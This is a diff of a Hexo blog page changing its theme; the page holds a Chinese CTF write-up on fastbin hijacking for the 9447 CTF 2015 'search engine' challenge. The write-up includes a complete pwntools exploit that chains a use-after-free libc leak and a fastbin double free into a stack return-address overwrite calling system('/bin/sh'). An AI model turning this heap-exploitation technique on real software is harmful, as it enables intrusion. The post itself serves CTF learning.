@@ -1,96 +1,171 @@
 <!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  
+<html lang="en">
 
-  
-  <title>fastbin_attack-search | Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="fastbin 劫持最近在看GitHub上的how2heap ，专门讲针对堆的攻击方法。本篇是看了fastbin_dup_into_stack.c和对应的题目9447 ctf 2015 search engine进行的总结。 在看fastbin_dup_into_stack.c时我还不太清楚将fastbin劫持到栈中能起到什么作用，看了search engine明白了，劫持到栈中是为了直接覆写返回">
-<meta property="og:type" content="article">
-<meta property="og:title" content="fastbin_attack-search">
-<meta property="og:url" content="http://yoursite.com/2018/06/05/fastbin-attack-search/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="fastbin 劫持最近在看GitHub上的how2heap ，专门讲针对堆的攻击方法。本篇是看了fastbin_dup_into_stack.c和对应的题目9447 ctf 2015 search engine进行的总结。 在看fastbin_dup_into_stack.c时我还不太清楚将fastbin劫持到栈中能起到什么作用，看了search engine明白了，劫持到栈中是为了直接覆写返回">
-<meta property="og:image" content="http://yoursite.com/2018/06/05/fastbin-attack-search/fastbin_1.png">
-<meta property="og:image" content="http://yoursite.com/2018/06/05/fastbin-attack-search/fastbin_2.png">
-<meta property="og:image" content="http://yoursite.com/2018/06/05/fastbin-attack-search/menu.png">
-<meta property="og:image" content="http://yoursite.com/2018/06/05/fastbin-attack-search/leak_stack.png">
-<meta property="og:image" content="http://yoursite.com/2018/06/05/fastbin-attack-search/leak_stack_2.png">
-<meta property="og:updated_time" content="2018-06-05T15:28:27.693Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="fastbin_attack-search">
-<meta name="twitter:description" content="fastbin 劫持最近在看GitHub上的how2heap ，专门讲针对堆的攻击方法。本篇是看了fastbin_dup_into_stack.c和对应的题目9447 ctf 2015 search engine进行的总结。 在看fastbin_dup_into_stack.c时我还不太清楚将fastbin劫持到栈中能起到什么作用，看了search engine明白了，劫持到栈中是为了直接覆写返回">
-<meta name="twitter:image" content="http://yoursite.com/2018/06/05/fastbin-attack-search/fastbin_1.png">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/favicon.png">
-  
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  <link rel="stylesheet" href="/css/style.css">
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="fastbin 劫持最近在看GitHub上的how2heap ，专门讲针对堆的攻击方法。本篇是看了fastbin_dup_into_stack.c和对应的题目9447 ctf 2015 search engine进行的总结。
+在看fastbin_dup_into_stack.c时我还不太清楚将fas">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="John Doe">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="fastbin_attack-search"/>
+    
+
+    <!--Open Graph Description-->
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="Hexo"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>fastbin_attack-search - Hexo</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
 </head>
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-      <div class="outer">
-        <section id="main"><article id="post-fastbin-attack-search" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/06/05/fastbin-attack-search/" class="article-date">
-  <time datetime="2018-06-05T15:26:06.000Z" itemprop="datePublished">2018-06-05</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="article-title" itemprop="name">
-      fastbin_attack-search
-    </h1>
-  
 
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about.html">
+                    About
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    Categories
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact.html">
+                    Contact
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2018/06/05/fastbin-attack-search/">
+                fastbin_attack-search
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2018-06-05</span>
+            
+            
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
         <h1 id="fastbin-劫持"><a href="#fastbin-劫持" class="headerlink" title="fastbin 劫持"></a>fastbin 劫持</h1><p>最近在看GitHub上的<a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">how2heap</a> ，专门讲针对堆的攻击方法。本篇是看了fastbin_dup_into_stack.c和对应的题目9447 ctf 2015 search engine进行的总结。</p>
 <p>在看fastbin_dup_into_stack.c时我还不太清楚将fastbin劫持到栈中能起到什么作用，看了search engine明白了，劫持到栈中是为了直接覆写返回地址，执行shell。</p>
 <p>[TOC]</p>
@@ -132,138 +207,188 @@
 <h3 id="4）exp"><a href="#4）exp" class="headerlink" title="4）exp"></a>4）exp</h3><p>（栈中偏移地址部分参考了其他<a href="https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/" target="_blank" rel="noopener">大佬</a>的数据，整体思路也是顺着这位大佬来的）</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./search"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_stack</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Quit\n"</span>)</span><br><span class="line">	p.sendline(<span class="string">"a"</span>*<span class="number">48</span>)</span><br><span class="line">	p.recvline()</span><br><span class="line"></span><br><span class="line">	p.sendline(<span class="string">"b"</span>*<span class="number">48</span>)</span><br><span class="line">	leak = p.recvline().split(<span class="string">' '</span>)[<span class="number">0</span>][<span class="number">48</span>:]</span><br><span class="line">    	<span class="keyword">return</span> int(leak[::<span class="number">-1</span>].encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(sentence)</span>:</span></span><br><span class="line">	<span class="comment">#p.recvuntil("Quit\n")</span></span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Enter the sentence size:\n"</span>)</span><br><span class="line">	p.sendline(str(len(sentence)))</span><br><span class="line">	p.recvuntil(<span class="string">"Enter the sentence:\n"</span>)</span><br><span class="line">	p.sendline(sentence)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(word)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Quit\n"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Enter the word size:\n"</span>)</span><br><span class="line">	p.sendline(str(len(word)))</span><br><span class="line">	p.recvuntil(<span class="string">"Enter the word:\n"</span>)</span><br><span class="line">	p.sendline(word)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span><span class="params">()</span>:</span></span><br><span class="line">	sentence = <span class="string">'a'</span>*<span class="number">12</span> + <span class="string">' b '</span></span><br><span class="line">	sentence = sentence.ljust(<span class="number">40</span>,<span class="string">'c'</span>)</span><br><span class="line">	index(sentence)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#delete s1</span></span><br><span class="line">	search(<span class="string">'b'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#n4 use s1</span></span><br><span class="line">	index(<span class="string">'d'</span>*<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#delete s1,but n4 still can use it=&gt;UAF</span></span><br><span class="line">	search(<span class="string">'\x00'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#a new sentence share space with n4</span></span><br><span class="line">	puts_got = <span class="number">0x602028</span></span><br><span class="line">	node =p64(<span class="number">0x400E90</span>) <span class="comment">#"Enter"</span></span><br><span class="line">	node += p64(<span class="number">5</span>)</span><br><span class="line">	node += p64(puts_got)</span><br><span class="line">	node += p64(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">	index(node)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#search 'Enter' to leak puts_address</span></span><br><span class="line">	search(<span class="string">'Enter'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Found 64: "</span>)</span><br><span class="line">	puts_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"###puts_addr:0x%x"</span> %puts_addr</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> puts_addr</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overwrite_retn</span><span class="params">()</span>:</span></span><br><span class="line">	index(<span class="string">'a'</span>*<span class="number">54</span>+<span class="string">' d'</span>)</span><br><span class="line">	index(<span class="string">'b'</span>*<span class="number">54</span>+<span class="string">' d'</span>)</span><br><span class="line">	index(<span class="string">'c'</span>*<span class="number">54</span>+<span class="string">' d'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># a-&gt;b-&gt;c-&gt;NULL</span></span><br><span class="line">	search(<span class="string">'d'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'y'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'y'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># b-&gt;a-&gt;b-&gt;c-&gt;NULL</span></span><br><span class="line">	search(<span class="string">'\x00'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'y'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># fake fastbin</span></span><br><span class="line">	index(p64(stack_addr).ljust(<span class="number">56</span>,<span class="string">'e'</span>))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># malloc a and b</span></span><br><span class="line">	index(<span class="string">'f'</span>*<span class="number">56</span>)</span><br><span class="line">	index(<span class="string">'g'</span>*<span class="number">56</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># overwrite the ret address with gadget</span></span><br><span class="line">	pop_ret = <span class="number">0x400e23</span></span><br><span class="line">	sentence = <span class="string">'A'</span>*<span class="number">30</span></span><br><span class="line">	sentence += p64(pop_ret)</span><br><span class="line">	sentence += p64(binsh_addr)</span><br><span class="line">	sentence += p64(system_addr)</span><br><span class="line"></span><br><span class="line">	index(sentence)</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="comment">#leak stack address</span></span><br><span class="line">stack_leak = leak_stack()</span><br><span class="line">stack_addr = stack_leak + <span class="number">0x22</span> - <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc address</span></span><br><span class="line">puts_addr = leak_libc()</span><br><span class="line">libc = ELF(<span class="string">'libc.so'</span>)</span><br><span class="line">system_addr = puts_addr - (libc.symbols[<span class="string">'puts'</span>]-libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">binsh_addr = puts_addr - (libc.symbols[<span class="string">'puts'</span>]-next(libc.search(<span class="string">'/bin/sh'</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#double free to edit the retn address in stack</span></span><br><span class="line">overwrite_retn()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-      
     </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/06/05/fastbin-attack-search/" data-id="cjix4iud500012clu2eulc9od" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-    
-<nav id="article-nav">
-  
-    <a href="/2018/06/05/hitbctf2018-once/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          hitbctf2018-once
-        
-      </div>
-    </a>
-  
-  
-    <a href="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">unsortedbin_attack--0ctf zerostorage</div>
-    </a>
-  
-</nav>
 
-  
-</article>
-
-</section>
-        
-          <aside id="sidebar">
-  
     
 
-  
     
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn-how2heap/">pwn;how2heap</a></li></ul>
-    </div>
-  </div>
 
-
-  
+    <!-- Comments -->
     
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/pwn-how2heap/" style="font-size: 10px;">pwn;how2heap</a>
-    </div>
-  </div>
 
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li></ul>
+</div>
+        </section>
+
     </div>
-  </div>
+</div>
 
 
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2018/06/27/青岛链弯杯-note/">青岛链弯杯--note</a>
-          </li>
-        
-          <li>
-            <a href="/2018/06/05/suctf2018-note/">suctf2018-note</a>
-          </li>
-        
-          <li>
-            <a href="/2018/06/05/hitbctf2018-once/">hitbctf2018-once</a>
-          </li>
-        
-          <li>
-            <a href="/2018/06/05/fastbin-attack-search/">fastbin_attack-search</a>
-          </li>
-        
-          <li>
-            <a href="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/">unsortedbin_attack--0ctf zerostorage</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
+</div>
 
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      &copy; 2018 John Doe<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2018/06/27/青岛链弯杯-note/">青岛链弯杯--note</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2018/06/05/suctf2018-note/">suctf2018-note</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2018/06/05/hitbctf2018-once/">hitbctf2018-once</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2018/06/05/fastbin-attack-search/">fastbin_attack-search</a>
+            </li>
+            
+        </ul>
     </div>
-  </div>
+
+
+
+            
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klugjo/hexo-theme-alpha-dust">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/?lang=en">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.instagram.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://dribbble.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://plus.google.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-google-plus"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.behance.net/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-behance"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://500px.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-500px"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:test@example.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="\#">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
+                </div>
+            </div>
+        </div>
+    </div>
 </footer>
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
 
-<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<!-- After footer scripts -->
 
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
 
-  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
 
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
 
-<script src="/js/script.js"></script>
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
 
 
 
-  </div>
 </body>
+
 </html>
